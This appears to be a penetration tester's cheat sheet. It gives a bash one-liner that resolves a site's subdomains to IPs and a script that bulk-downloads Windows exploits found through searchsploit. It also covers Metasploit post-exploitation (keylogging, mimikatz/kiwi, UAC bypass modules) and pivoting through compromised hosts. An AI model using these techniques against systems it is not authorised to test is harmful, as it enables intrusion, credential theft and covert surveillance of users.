TURN A WEBPAGE INTO IP ADDRESSES:
grep -o "[^/]*.<domain>.<tld>" <FILE> | sort -u > sitelist.txt
for url in $(cat sitelist.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u

This pulls all links from an html file for a specified domain and puts them in a list.
Second command iterates list and resolves IPv4 then trims and sorts.

#!/bin/bash
# Bash script to search for a given exploit and download all matches.

for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")

do
  exp_name=$(echo $e | cut -d "/" -f 5)
  url=$(echo $e | sed 's/exploits/raw/')
  wget -q --no-check-certificate $url -O $exp_name
done


MSFTRICKS:
AutoRunScript set to a script you want to automatically run
The script has the .rc extension and is like a bash script
  in terms of its simplicity. The script will execute 
  automatically when the handler catches the shell.
You can run scripts on startup by passing:
  msfconsole -r <script>

Post-Exploitation with msf:
screenshot takes a screenshot 
keyscan_start
keyscan_dump
keyscan_stop
^Keylogger control.
To get anything good on a keylogger, we have to migrate
the session to the user. Do this with ps, pick a pid 
that looks good and then migrate <PID> 

There are also modules you can use for post-Exploitation
bypassuac_injection_winsxs
mimikatz is kiwi on msf

PIVOTING:
With msf, pivoting is easy. You can add routes to sessions
with route add <CIDR> <SESS> 
This lets you tell msf that there are multiple interfaces
accessible from a given session. All your commands will
be autorouted so you just get to sit back.

You can only autoroute from a bind shell because reverse
shells don't give the compromised endpoint a good path 
to you.

Using autoroute in combination with the socks4a module 
lets you run proxychains provided you append the socks4a 
into your proxychains.conf. 

portfwd is a module that does what you already know how to 
do.
